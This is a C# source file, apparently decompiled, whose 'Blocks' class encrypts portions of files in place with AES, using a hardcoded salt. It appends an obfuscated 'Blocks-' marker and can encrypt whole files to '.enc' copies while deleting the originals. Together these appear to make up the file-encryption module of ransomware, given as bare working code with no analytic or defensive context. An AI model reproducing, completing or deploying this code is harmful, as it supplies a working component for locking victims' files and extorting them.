using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Complex;

internal class Blocks
{
	public const int AES256KeySize = 256;

	public static void TrimFile(string filename, int bytesToDelete)
	{
		FileInfo fileInfo = new FileInfo(filename);
		FileStream fileStream = fileInfo.Open(FileMode.Open);
		fileStream.SetLength(Math.Max(0L, fileInfo.Length - bytesToDelete));
		fileStream.Close();
	}

	public static int GetEven(long input)
	{
		return (int)input;
	}

	public static void BlockProcess(string fileInfo, string PartialSize, string DynamicPass)
	{
		using (FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
		{
			int num = GetEven(fileStream.Length) / 3;
			int num2 = Convert.ToInt32(PartialSize) * Convert.ToInt32(fileStream.Length) / 100;
			if (num < num2)
			{
				num2 = num - 1024;
			}
			int count = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
			for (int i = 0; i < 2; i++)
			{
				byte[] clear = ReadFromFile(fileStream, count, num * i);
				byte[] encrypted = Encryptions.AESEncryptBytes(clear, Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
				WriteToFile(fileStream, encrypted, num * i);
			}
		}
		byte[] bytes = Encoding.ASCII.GetBytes(Program.Base64Decode("QmxvY2tz") + Program.Base64Decode("LQ==") + Convert.ToString(PartialSize) + Program.Base64Decode("LQ=="));
		using FileStream fileStream2 = new FileStream(fileInfo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream2.Write(bytes, 0, bytes.Length);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static byte[] RandomByteArray(int length)
	{
		byte[] array = new byte[length];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool AESEncryptFile(string filePath, byte[] password, bool delete)
	{
		byte[] array = RandomByteArray(16);
		using FileStream fileStream = new FileStream(filePath + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = GenerateKey(password, array);
		password = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(filePath, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (delete)
			{
				File.Delete(filePath);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool AESDecryptFile(string filePath, byte[] password, bool keep)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(filePath, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = GenerateKey(password, array);
		password = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(filePath.Remove(filePath.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] AESEncryptBytes(byte[] clear, byte[] password, byte[] salt)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = GenerateKey(password, salt);
		password = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(clear, 0, clear.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static byte[] AESDecryptBytes(byte[] encrypted, byte[] password, byte[] salt)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = GenerateKey(password, salt);
		password = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(encrypted, 0, encrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static bool CheckPassword(byte[] password, byte[] salt, byte[] key)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = GenerateKey(password, salt);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(key);
	}

	public static Rfc2898DeriveBytes GenerateKey(byte[] password, byte[] salt)
	{
		return new Rfc2898DeriveBytes(password, salt, 52768);
	}

	public static byte[] ReadFromFile(FileStream stream, int count, int offset = 0)
	{
		byte[] array = new byte[count];
		stream.Position = offset;
		stream.Read(array, 0, count);
		return array;
	}

	public static void WriteToFile(FileStream stream, byte[] encrypted, int offset = 0)
	{
		stream.Position = offset;
		stream.Write(encrypted, 0, encrypted.Length);
	}
}
